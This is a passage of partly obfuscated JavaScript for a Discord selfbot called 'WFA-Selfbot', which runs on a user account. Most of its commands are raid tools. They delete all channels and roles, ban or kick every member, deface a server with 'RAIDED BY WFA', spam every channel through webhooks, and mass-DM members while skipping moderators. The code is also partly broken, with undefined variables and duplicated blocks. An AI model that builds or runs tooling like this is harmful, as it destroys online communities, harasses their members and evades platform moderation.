            '\n                                    \u2588\u2588\u2557    \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n                                    \u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\n                                    \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2557  \n                                    \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255D  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551    \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255D  \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255D  \n                                    \u255A\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \n                                     \u255A\u2550\u2550\u255D\u255A\u2550\u2550\u255D \u255A\u2550\u255D     \u255A\u2550\u255D  \u255A\u2550\u255D    \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D  \n------------------------------------------------------------------------------------------------------------------------\n    '
          )
        )
        console.log(
          consolecolor(
            'blue',
            'magenta'
          )(
            '\n                                            [#] Version: ' +
              ver +
              '   \n                                            [#] Prefix: ' +
              prefix +
              '\n                                            [#] Login on: ' +
              client.user.username +
              '\n                                            [#] ID: ' +
              client.user.id +
              '\n                                            [#] Bot: ' +
              a5 +
              '\n                                            [#] Nitro: ' +
              a4 +
              '\n                                            [#] Number of friends: ' +
              client.user.friends.size +
              '\n                                            [#] Number of servers: ' +
              client.guilds.size +
              '\n                                            [#] Number of channels: ' +
              client.channels.size +
              '\n                                            [#] Number of members: ' +
              client.guilds
                .map((a8) => a8.memberCount)
                .reduce((a8, a9) => a8 + a9) +
              '\n                                            [#] Number of bots: ' +
              client.users.filter((a8) => a8.bot).size +
              '\n                                            [#] NSFW: ' +
              V +
              '\n                                            [#] Nitro Auto Claim: On\n                                            [#] Youtube: ' +
              m +
              '\n                                            [#] Discord: ' +
              n +
              '\n                                            ' +
              U +
              '\n\n\nMessage for you: ' +
              l +
              '\n'
          )
        )
      })
      client.on('ready', async () => {
        setTimeout(() => {
          console.log(consolecolor.morning('logs:')),
            console.log(consolecolor.morning('' + T))
        }, 500)
      })
      client.on('ready', function () {
        rpcGenerator
          .getRpcImage('777619769637339156', 'wfa_logo')
          .then((a6) => {
            const a7 = {
              PwqrU: 'WFA-Selfbot',
              sgRJt: a5.HdBAj,
              cDQSl: a5.YOFNF,
              fTUFw: a5.GLqxN,
              wFPWV: a5.yFjpv,
            }
            const a8 = a7
            rpcGenerator.getRpcImage(a5.YOFNF, a5.nsILC).then((a9) => {
              let aa = new rpcGenerator.Rpc()
                .setName(a8.PwqrU)
                .setUrl('https://www.twitch.tv/OGAGAL_risitas')
                .setType(a8.sgRJt)
                .setApplicationId(a8.cDQSl)
                .setDetails(a8.fTUFw)
                .setAssetsLargeImage(a9.id)
                .setAssetsSmallImage(a6.id)
                .setAssetsLargeText('WFA')
                .setState(a8.wFPWV)
                .setStartTimestamp(Date.now())
                .setParty({ id: uuid() })
              client.user.setPresence(aa.toDiscord()).catch((ab) => {})
            })
          })
      })
      function W() {
        fs.writeFile('./Data/pubmp.json', JSON.stringify(z), (a4) => {
          if (a4) {
            console.log(a4)
          }
        })
      }
      function X() {
        fs.writeFile('./Data/groupe.json', JSON.stringify(z), (a5) => {
          if (a5) {
            console.log(a5)
          }
        })
      }
      function Y() {
        fs.writeFile('./Data/afk.json', JSON.stringify(y), (a5) => {
          if (a5) {
            console.error(a5)
          }
        })
      }
      function Z() {
        fs.writeFile('./Data/liste.json', JSON.stringify(A), (a5) => {
          if (a5) {
            console.error(a5)
          }
        })
      }
      function a0() {
        fs.writeFile('./Data/vkick.json', JSON.stringify(B), (a4) => {
          if (a4) {
            console.error(a4)
          }
        })
      }
      function a1() {
        fs.writeFile('./Data/backups.json', JSON.stringify(w), (a4) => {
          if (a4) {
            console[_0x47d837(-391, 1125, 677, 1495)](a4)
          }
        })
      }
      function a2(a4) {
        var a8 = ''
        var a7 =
          'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        var a5 = a7.length
        for (var a6 = 0; a6 < a4; a6++) {
          a8 += a7.charAt(Math.floor(Math.random() * a5))
        }
        return a8
      }
      client.on('message', (a4) => {
        var a6 = a4.content.substring(prefix.length).split(' '),
          a7 = a4.mentions.users.first()
        async function a9() {
          const an = Math.floor(Math.random() * 1500)
          async function ao() {
            a4.react('\uD83C\uDF89').catch((aq) => {
              if (aq) {
                console.log(' ')
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    "[EVENT] I couldn't react to the giveaway on " +
                      a4.guild.name +
                      ", it's possible I don't have the permissions :/"
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
                return
              }
            })
            console.log(' ')
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(
              consolecolor.atlas(
                '[EVENT] I reacted correctly to the giveaway on ' +
                  a4.guild.name +
                  ' in ' +
                  an +
                  'ms I am super fast hehe ;)'
              )
            )
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(' ')
          }
          setTimeout(ao, an)
        }
        async function aa() {
          if (
            a4.author.id == '294882584201003009' ||
            a4.author.id == '716967712844414996'
          ) {
            if (a4.content.includes('Congratulations')) {
              if (a4.content.includes(client.user.id)) {
                if (a4.embeds) {
                  console.log(' ')
                }
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    '[EVENT] GG I made you win the giveaway on the server ' +
                      a4.guild.name +
                      ', go quickly claim your reward'
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
              }
            }
          }
        }
        aa()
        a4.author.id == '294882584201003009' ||
          (a4.author.id == '716967712844414996' &&
            a4.embeds[0] &&
              a4.embeds[0].description.includes('React with') && a9())
        if (a4.author.id == client.user.id) {
          if (x[client.user.id]) {
            if (a4.content.includes(':x:')) {
              return
            } else {
              delete x[client.user.id]
            }
            Y()
            a4.channel.send(':white_check_mark: **You are no longer afk**')
            console.log(consolecolor.instagram('[COMMAND] afk stopped'))
          }
        }
        if (a4.content.includes(client.user.id)) {
          if (a4.author.id === client.user.id) {
            return
          }
          if (x[client.user.id]) {
            a4.reply(
              ':x: **Je suis afk pour la raison** ' + x[client.user.id].r
            )
            console.log(' ')
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(
              consolecolor.atlas(
                '[EVENT] The user ' +
                  a4.author.username +
                  ' just pinged you on your afk'
              )
            )
            console.log(consolecolor.atlas('[EVENT] Message: ' + a4.content))
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(' ')
          } else {
            return
          }
        }
        if (a4.channel.type === 'dm') {
          if (a8.author.bot) {
            if (a4.content.includes('discord.gg')) {
              let aq = a4.author
              aq.send('/!\\ Anti mp').then((ar) => {
                ar.delete()
              })
              console.log(' ')
              console.log(
                consolecolor.fruit(
                  '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                )
              )
              console.log(
                consolecolor.atlas(
                  '[EVENT] The bot ' +
                    a4.author.username +
                    ' has sent you a discord invitation'
                )
              )
              console.log(consolecolor.atlas('[EVENT] Message: ' + a4.content))
              console.log(
                consolecolor.fruit(
                  '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                )
              )
              console.log(' ')
            }
          }
        }
        if (a8.author.id !== client.user.id) {
          return
        }
        a4.content.startsWith(prefix + 'cmd') &&
          (a4.edit(
            ghost +
              'https://en-cmd.wfaself.repl.co\n    https://en-cmd-1.wfaself.repl.co\n    https://en-cmd-2.wfaself.repl.co\n    https://en-cmd-3.wfaself.repl.co\n    https://en-cmd-4.wfaself.repl.co'
          ),
          console.log(consolecolor.instagram('[COMMAND] cmd command executed')))
        a4.content.startsWith(prefix + 'help') &&
          (a4.edit(ghost + 'https://en-help.wfaself.repl.co').catch((ar) => {}),
          console.log(
            consolecolor.instagram('[COMMAND] help command executed')
          ))
        if (a4.content.startsWith(prefix + 'help fun')) {
          a4.edit(
            ghost +
              'https://en-fun.wfaself.repl.co\nhttps://en-fun-1.wfaself.repl.co'
          ).catch((as) => {})
          console.log(
            consolecolor.instagram('[COMMAND] help fun command executed')
          )
        }
        a4.content.startsWith(prefix + 'help hack') &&
          (a4.edit(ghost + 'https://en-hack.wfaself.repl.co').catch((as) => {}),
          console.log(
            consolecolor.instagram('[COMMAND] help hack command executed')
          ))
        if (a4.content.startsWith(prefix + 'help raid')) {
          a4.edit(ghost + 'https://en-raid.wfaself.repl.co').catch((at) => {})
          console.log(
            consolecolor.instagram('[COMMAND] help raid command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'help status')) {
          a4.edit(
            ghost +
              'https://en-status-2.wfaself.repl.co\n    https://en-status-1.wfaself.repl.co\n    https://en-status-3.wfaself.repl.co\n    https://en-status-4.wfaself.repl.co'
          )
          console.log(
            consolecolor.instagram('[COMMAND]e help status command executed')
          )
        }
        a4.content.startsWith(prefix + 'help backup') &&
          (a4.edit(ghost + 'https://en-backup.wfaself.repl.co'),
          console.log(
            consolecolor.instagram('[COMMAND]e help backup command executed')
          ))
        a4.content.startsWith(prefix + 'help moderation') &&
          (a4.edit(ghost + 'https://en-mod.wfaself.repl.co'),
          console.log(
            consolecolor.instagram(
              '[COMMAND]e help moderation command executed'
            )
          ))
        if (a4.content.startsWith(prefix + 'help utile')) {
          a4.edit(
            ghost +
              'https://en-util.wfaself.repl.co\nhttps://en-util-1.wfaself.repl.co/\nhttps://en-util-2.wfaself.repl.co/\nhttps://en-util-3.wfaself.repl.co/'
          )
          console.log(
            consolecolor.instagram('[COMMAND]e help utile command executed')
          )
        }
        if (a4.content === prefix + 'delete all channels') {
          let aw = a4.guild
          if (!aw) {
            a4.edit(':x: **Please run this command in a server!**')
            return
          }
          if (!a4.member.hasPermission('MANAGE_CHANNELS')) {
            return a4
              .delete()
              .then(
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'insufficient permission'.green
                )
              )
          }
          var ab = a4.guild.channels
          ab.forEach((ay) => {
            ay.delete().catch((aA) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          })
          console.log(
            consolecolor.instagram(
              '[COMMANDE] Command delete all channel command executed'
            )
          )
        }
        if (a4.content === prefix + 'delete all roles') {
          let ay = a8.guild
          if (!ay) {
            a4.edit(':x: **Please run this command on a server!**')
            return
          }
          a4.guild.roles.forEach((aA) => {
            aA.delete().catch((aB) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMAND] delete all role command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'name all')) {
          let aB = a4.guild
          if (!aB) {
            return a8.edit(':x: **Please run this command on a server**')
          }
          const aC =
            a4.content.split(' ').slice(2).join(' ') || a4.author.username
          if (!a4.member.hasPermission('MANAGE_NICKNAMES')) {
            return a4
              .delete()
              .then(
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'insufficient permission'.green
                )
              )
          }
          const aD = a4.guild.members
          a8.edit('Je renomme tout le monde par ' + aC)
          aD.forEach((aE) => {
            aE.setNickname(aC).catch((aF) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMAND] name all command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'all ban')) {
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(
              ':x: **Cette commande ne marche que sur un serveur**.'
            )
          }
          if (!a4.member.permissions.has('BAN_MEMBERS')) {
            return a4
              .delete()
              .then(
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'Il te manque des permissions'.green
                )
              )
          }
          a4.delete().catch((aE) => {})
          a4.guild.members.cache.forEach((aE) => {
            const aF = { reason: 'All Ban' }
            aE.ban(aF).catch((aG) => {})
          })
        }
        if (a4.content.startsWith(prefix + 'all ban')) {
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(
              ':x: **Cette commande ne marche que sur un serveur**.'
            )
          }
          if (!a4.member.permissions.has('KICK_MEMBERS')) {
            return a4
              .delete()
              .then(
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'Il te manque des permissions'.green
                )
              )
          }
          a4.delete().catch((aE) => {})
          a4.guild.members.cache.forEach((aE) => {
            const aF = { reason: 'All kick' }
            aE.kick(aF).catch((aG) => {})
          })
        }
        if (a4.content.startsWith(prefix + 'mp all')) {
          if (!a4.guild) {
            return a4.edit(':x: **Command only usable in server**')
          }
          a4.delete()
          console.log(consolecolor.instagram('[COMMAND] Commande mp all used'))
          let aE = 0,
            aF =
              a6.splice(2).join(' ') ||
              '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aG = a4.guild
          if (!aG) {
            return
          }
          setInterval(() => {
            let aJ = aG.members.random()
            if (aJ.user.bot) {
              return
            }
            if (aJ.user.id === client.user.id) {
              return
            }
            if (aJ.hasPermission('ADMINISTRATOR')) {
              return
            }
            if (aJ.hasPermission('MANAGE_MESSAGES')) {
              return
            }
            if (aJ.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) {
              return
            }
            if (aJ.hasPermission('BAN_MEMBERS')) {
              return
            }
            if (z[aJ.user.id]) {
              return
            }
            aE++
            aJ.send('Hello ^^')
              .then((aL) => aL.edit(aF))
              .catch((aL) =>
                console.log('[', 'ERROR'.red, ']', 'an error occurate'.green)
              )
            console.log(('[DM Send]  |' + aJ.user.username).green + '|  ' + aE)
            const aK = { raison: 'mp' }
            z[aJ.user.id] = aK
            W()
          }, 8000)
        }
        a4.content.startsWith(prefix + 'stop mp all') &&
          (a4.delete(),
          console.log(
            consolecolor.instagram('[COMMAND] Commande mp all stoped')
          ),
          client.destroy().then(() => client.login(token)))
        if (a4.content === prefix + 'all kick') {
          let aI = a4.guild
          if (!aI) {
            return a8.edit(':x: **Please run this command on a server**')
          }
          if (!a4.member.hasPermission('KICK_MEMBERS')) {
            return a4
              .delete()
              .then(
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'insufficient permission'.green
                )
              )
          }
          const aJ = a4.guild.members
          aJ.forEach((aK) => {
            if (!aK.kickable) {
              return
            }
            aK.kick().catch((aL) =>
              console.log(
                '[',
                'ERROR'.red,
                ']',
                'an error has occurred that I cannot fix'.green
              )
            )
          })
          console.log(
            consolecolor.instagram('[COMMAND] kick all command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'deface')) {
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(':x: **Command only usable on server**.')
          }
          if (!a4.member.hasPermission('ADMINISTRATOR')) {
            return a4.edit(
              ':x: **You do not have the permissions to run this command**'
            )
          }
          a4.delete()
          a4.guild.setName('RAIDED BY WFA X ' + client.user.username)
          a4.guild.setIcon(
            'https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676'
          )
          a4.guild.channels.forEach((aM) => {
            if (!aM) {
              return
            }
            aM.delete()
          })
          a4.guild.createChannel('wfa', 'text')
          console.log(
            consolecolor.instagram('[COMMAND] deface command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'create channel')) {
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(':x: **Command only usable on server**.')
          }
          if (!a4.member.hasPermission('MANAGE_CHANNELS')) {
            return a4.edit(
              ':x: **You do not have the permissions to run this command**'
            )
          }
          a4.delete()
          for (let aM = 0; aM < 20; aM++) {
            a4.guild
              .createChannel('WFA-\uD835\uDC31-' + client.user.username, 'text')
              .catch((aN) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'an error has occurred that I cannot fix'.green
                )
              )
          }
          console.log(
            consolecolor.instagram('[COMMAND] create channel command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'webhook spam')) {
          let aP =
            a6.splice(2).join(' ') ||
            '@everyone\nWFA\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg'
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(':x: **Command only usable on server**.')
          }
          if (!a4.member.hasPermission('MANAGE_WEBHOOKS')) {
            return
          }
          a4.guild.channels.forEach((aQ) => {
            if (!aQ) {
              return
            }
            aQ.type == 'text' &&
              aQ
                .createWebhook(
                  'WFA-Selfbot',
                  'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU'
                )
                .catch((aS) =>
                  console.log(
                    '[',
                    'ERROR'.red,
                    ']',
                    'an error has occurred that I cannot fix'.green
                  )
                )
          })
          setInterval(async function () {
            await a4.guild
              .fetchWebhooks()
              .then((aQ) =>
                aQ.forEach((aR) =>
                  aR
                    .send(aP)
                    .catch((aS) =>
                      console.log(
                        '[',
                        'ERROR'.red,
                        ']',
                        'an error has occurred that I cannot fix'.green
                      )
                    )
                )
              )
          })
          console.log(
            consolecolor.instagram('[COMMAND] webhook spam command executed')
          )
        }
        a4.content.startsWith(prefix + 'start bumping') &&
          (a4.delete(),
          a4.channel.send('!d bump'),
          setInterval(() => {
            a4.channel.send('!d bump')
          }, 7203000),
          console.log(
            consolecolor.instagram('[COMMAND] start bumping command executed')
          ))
        if (a4.content.startsWith(prefix + 'get guild banner')) {
          a4.delete()
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(':x: **Command only usable on server**.')
          }
          console.log(
            consolecolor.instagram(
              '[COMMAND] get guild banner command executed'
            )
          )
          console.log(
            consolecolor.summer(
              '[BANNIERE] Here is the banner: ' + a4.guild.bannerURL
            )
          )
        }
        if (a4.content.startsWith(prefix + 'get guild pfp')) {
          a4.delete()
          if (a4.channel.type === 'dm' || a4.channel.type === 'group') {
            return a4.edit(':x: **Command only usable on server**.')
          }
          console.log(
            consolecolor.instagram('[COMMAND] get guild pfp command executed')
          )
          console.log(
            consolecolor.summer(
              '[BANNIERE] Here is the pfp: ' + a4.guild.iconURL
            )
          )
        }
        if (a4.content.startsWith(prefix + 'dm all')) {
          if (!a4.guild) {
            return a4.edit(':x: **Command only usable on server**')
          }
          a4.delete()
          console.log(
            consolecolor.instagram('[COMMAND] dm all command executed')
          )
          let aR = 0,
            aS =
              a6.splice(2).join(' ') ||
              '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aT = a4.guild
          if (!aT) {
            return
          }
          setInterval(() => {
            let aU = aT.members.random()
            if (aU.user.bot) {
              return
            }
            if (aU.user.id === client.user.id) {
              return
            }
            if (aU.hasPermission('ADMINISTRATOR')) {
              return
            }
            if (aU.hasPermission('MANAGE_MESSAGES')) {
              return
            }
            if (aU.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) {
              return
            }
            if (aU.hasPermission('BAN_MEMBERS')) {
              return
            }
            if (z[aU.user.id]) {
              return
            }
            aR++
            aU.send('Hello ^^')
              .then((aW) => aW.edit(aS))
              .catch((aW) =>
                console.log(
                  '[',
                  'ERROR'.red,
                  ']',
                  'an error has occurred that I cannot fix'.green
                )
              )
            console.log(
              ('[MP Envoyé]  |' + aU.user.username).green +
                '|  ' +
                aR +
                ' / ' +
                a8.guild.members.filter(
                  (aW) => aW.presence.status !== 'offline'
                ).size +
                ' '
            )
            const aV = { raison: 'mp' }
            z[aU.user.id] = aV
            W()
          }, 1000)
        }
        if (a4.content.startsWith(prefix + 'stop dm all')) {
          if (a4.deletable) {
            a4.delete()
          }
          commandIntervals.forEach((aV) => {
            clearInterval(aV)
          })
          console.log(consolecolor.instagram('[COMMAND] dm all stoped'))
        }
        if (a4.content.startsWith(prefix + 'stop auto voice kick')) {
          if (!a4.guild) {
            return a4.edit(':x: **Please run this command on a server**')
          }
          if (!a7) {
            return a4.edit(':x: **Please Mention a user**')
          }
          if (!B[a4.guild.id]) {
            return a4.edit(
              ":x: **you haven't voice-blacklist an user in this server**"
            )
          }
          if (!B[a4.guild.id].user === a7.id) {
            return a4.edit(":x: **you haven't voice-blacklist this user**")
          }
          a7 &&
            (delete B[a4.guild.id],
            console.log(
              consolecolor.instagram('[COMMAND] auto voice kick command stoped')
            ),
            a4.edit(
              ':white_check_mark: **Auto Voice kick stoped for this user**'
            ),
            a0())
        }
        if (a4.content.startsWith(prefix + 'auto voice kick')) {
          if (!a4.guild) {
            return a4.edit(':x: **Please run this command on a server**')
          }
          if (!a4.guild.me.hasPermission('MOVE_MEMBERS')) {
            return a4.reply(":x:**You don't have permission to kick a user**.")
          }
          const aV = a4.mentions.members.first()
          if (!aV) {
            if (a7) {
              const aX = { user: a7.id }
              B[a4.guild.id] = aX
              console.log(
                consolecolor.instagram(
                  '[COMMAND] auto voice kick command executed'
                )
              )
              a4.edit(
                ':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**'
              )
              a0()
            }
            return
          }
          aV.setVoiceChannel(null).catch((aY) => (aY = 1))
          const aW = { user: a7.id }
          B[a4.guild.id] = aW
          a0()
          console.log(
            consolecolor.instagram('[COMMAND] auto voice kick command executed')
          )
          a4.edit(
            ':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**'
          )
        }
        if (a4.content.startsWith(prefix + 'voice kick')) {
          if (!a4.guild) {
            return a4.edit(':x: **Please run this command on a server**')
          }
          if (!a4.guild.me.hasPermission('MOVE_MEMBERS')) {
            return a4.reply(":x:**You don't have permission to kick a user**.")
          }
          const aY = a4.mentions.members.first()
          if (!aY) {
            return a4.edit(':x:**Please mention a user.**')
          }
          if (!aY.voiceChannel) {
            return a4.edit(':x:**The user is not in a voice channel.**')
          }
          a4.edit(
            ':white_check_mark: **The user has been voice kicked correctly**'
          )
          console.log(
            consolecolor.instagram('[COMMAND] voice kick command executed')
          )
          a4.edit(
            ':white_check_mark: **The user has been voice kicked correctly**'
          ),
            console.log(
              consolecolor.instagram('[COMMAND] voice kick command executed')
            )
        }
        if (a4.content.startsWith(prefix + 'nuke dm')) {
          a4.edit('**Nuking dms...**')
          client.users.forEach((b0) => b0.deleteDM().catch((b1) => {}))
          a4.edit(':white_check_mark: **Nuked dms**')
          console.log(
            consolecolor.instagram('[COMMAND] nuke dm command executed')
          )
        }
        if (a4.content.startsWith(prefix + 'afk')) {
          let b0 = a6.splice(1).join(' ') || 'WFA-SELFBOT'
          const b1 = { r: b0 }
          a4.edit(':white_check_mark: **You are afk for**' + b0)
          console.log(consolecolor.instagram('[COMMAND] afk command executed'))
          x[client.user.id] = b1
          Y()
          a4.edit(':white_check_mark: **You are afk for**' + b0),
            console.log(
              consolecolor.instagram('[COMMAND] afk command executed')
            )
        }
        if (a4.content.startsWith(prefix + 'anti group on')) {
          let b3 = a6.splice(1).join(' ') || 'WFA-SELFBOT'
          const b4 = { r: b3 }
          a4.edit(
            ':white_check_mark: **you will leave the new groups saying: ** ' +
              b3
          )
          console.log(
            consolecolor.instagram('[COMMAND] anti groupe command executed')
          )
          y[client.user.id] = b4
          X()
          a4.edit(
            ':white_check_mark: **you will leave the new groups saying: ** ' +
              b3
          ),
            console.log(
              consolecolor.instagram('[COMMAND] anti groupe command executed')
            )
        }
        a4.content.startsWith(prefix + 'anti groupe off') &&
          (delete y[client.user.id],
          X(),
          (a4.edit(':white_check_mark: **the anti group is deactivated'),
          console.log(consolecolor.instagram('[COMMAND] anti groupe stopé'))))
        if (a4.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
          const b5 = a4.mentions.users.first() || a4.author
          a4.edit(
            ghost +
